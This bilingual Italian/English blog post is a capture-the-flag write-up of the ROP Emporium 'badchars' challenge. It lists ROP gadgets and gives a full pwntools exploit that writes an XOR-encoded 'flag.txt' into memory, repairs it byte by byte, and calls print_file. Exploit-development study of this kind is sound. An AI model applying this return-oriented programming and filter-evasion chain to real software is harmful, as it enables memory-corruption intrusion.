---
layout: cyber-post
title: "ROP Emporium: badchars - Writing around forbidden bytes"
date: 2024-11-15
categories: 
  - writeups
  - stack
tags:
  - rop
  - bad chars
  - xor gadget
  - write-what-where
  - rop emporium
  - stack
  - pwn
  - ctf
excerpt: "Writeup di badchars (ROP Emporium): la stringa flag.txt contiene byte proibiti, quindi la scriviamo codificata e la ripariamo in memoria con un gadget xor"
---

<div id="star-alert" class="star-alert">
  <div class="star-alert-content">
    <span class="star-icon">⭐</span>
    <span class="star-text lang-it">Ti piace il sito?</span>
    <span class="star-text lang-en">Do you like the site?</span>
    <br>
    <span class="star-text lang-it">Lascia una stella su GitHub!</span>
    <span class="star-text lang-en">Leave a star on GitHub!</span>
    <br>
    <a href="https://github.com/Chris1sFlaggin/Chris1sFlaggin.github.io" target="_blank" class="star-button">
      <span class="lang-it">⭐ Stella</span>
      <span class="lang-en">⭐ Star</span>
    </a>
    <button id="close-star-alert" class="close-button">&times;</button>
  </div>
</div>

<div class="lang-it" markdown="1">
PWN CTF challenge write up. Challenge della serie **ROP Emporium**.

---

# badchars

## Il problema

`badchars` è l'evoluzione di [write4]({{ site.baseurl }}/): dobbiamo di nuovo scrivere `"flag.txt"` in memoria e chiamare `print_file`, ma alcuni byte sono **filtrati** dal programma (i "bad chars"). Se compaiono nel nostro payload vengono corrotti prima di arrivare a destinazione — inclusi i byte della stringa `flag.txt` stessa e alcuni indirizzi.

L'idea: **scrivere la stringa in forma codificata** (XOR con una costante che elimina i bad char) e poi ripararla in memoria byte per byte con un gadget `xor`.

Gadget a disposizione:

</div>

<div class="lang-en" markdown="1">
PWN CTF challenge write up. Challenge from the **ROP Emporium** series.

---

# badchars

## The problem

`badchars` is the evolution of [write4]({{ site.baseurl }}/): again we must write `"flag.txt"` into memory and call `print_file`, but some bytes are **filtered** by the program (the "bad chars"). If they appear in our payload they get corrupted before reaching their destination — including the bytes of the `flag.txt` string itself and some addresses.

The idea: **write the string in encoded form** (XORed with a constant that avoids the bad chars) and then repair it in memory byte by byte with an `xor` gadget.

Available gadgets:

</div>

```zsh
0x40069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x400634 : mov qword [r13], r12 ; ret     # write-what-where
0x400628 : xor byte [r15], r14b ; ret     # patch di un singolo byte
0x4006a0 : pop r14 ; pop r15 ; ret
0x400510 : print_file (PLT)
```

<div class="lang-it" markdown="1">
## L'exploit

Scriviamo in `0x601400` la stringa codificata `"fl222t2t"` (una versione di `flag.txt` in cui i byte "cattivi" sono stati sostituiti con `2`). Poi, con il gadget `xor byte [r15], r14b`, ripariamo i singoli byte sbagliati calcolando il delta XOR che li riporta al valore corretto:

- posizione `2` (`2` → `a`): xor con `0x53`
- posizione `3` (`2` → `g`): xor con `0x55`
- posizione `4` (`2` → `.`): xor con `0x1c`
- posizione `6` (`2` → `x`): xor con `0x4a`

Infine chiamiamo `print_file(0x601400)`.

</div>

<div class="lang-en" markdown="1">
## The exploit

We write into `0x601400` the encoded string `"fl222t2t"` (a version of `flag.txt` where the "bad" bytes have been replaced with `2`). Then, with the `xor byte [r15], r14b` gadget, we repair the individual wrong bytes by computing the XOR delta that restores them:

- position `2` (`2` → `a`): xor with `0x53`
- position `3` (`2` → `g`): xor with `0x55`
- position `4` (`2` → `.`): xor with `0x1c`
- position `6` (`2` → `x`): xor with `0x4a`

Finally we call `print_file(0x601400)`.

</div>

```python
from pwn import *

p = remote('192.168.0.200', 1240)

flag        = b"fl222t2t"                       # flag.txt codificata (no bad chars)
writeable   = 0x601400
pop4        = p64(0x40069c)                     # pop r12/r13/r14/r15 ; ret
mov_r13_r12 = p64(0x400634)                     # mov [r13], r12 ; ret
xor_r15_r14 = p64(0x400628)                     # xor byte [r15], r14b ; ret
pop_r14_r15 = p64(0x4006a0)
ret         = p64(0x4006a3)
print_file  = p64(0x400510)

payload  = b'A'*40
# scrivi la stringa codificata: r12=flag, r13=dst
payload += pop4 + flag + p64(writeable) + p64(0x53) + p64(writeable + 2)
payload += mov_r13_r12
payload += xor_r15_r14                           # patch byte 2
# patch byte 3 ('g')
payload += pop_r14_r15 + p64(0x55) + p64(writeable + 3) + xor_r15_r14
# patch byte 4 ('.')
payload += pop_r14_r15 + p64(0x1c) + p64(writeable + 4) + xor_r15_r14
# patch byte 6 ('x')
payload += pop_r14_r15 + p64(0x4a) + p64(writeable + 6) + xor_r15_r14
# print_file(writeable)
payload += ret + p64(writeable) + print_file

p.recvuntil(b'>')
p.sendline(payload)
p.interactive()
```

<div class="lang-it" markdown="1">
Il pattern "codifica → scrivi → decodifica in place" è generalissimo: lo stesso approccio serve ogni volta che un filtro sull'input ti impedisce di piazzare direttamente i byte che vuoi (bad chars, alphanumeric shellcode, ecc.).

> 💭 Se hai bisogno di chiarimenti scrivimi pure su discord: *chris1sflaggin*.
</div>

<div class="lang-en" markdown="1">
The "encode → write → decode in place" pattern is very general: the same approach works whenever an input filter stops you from placing the bytes you want directly (bad chars, alphanumeric shellcode, etc.).

> 💭 If you need any clarification, feel free to text me on discord: *chris1sflaggin*.
</div>
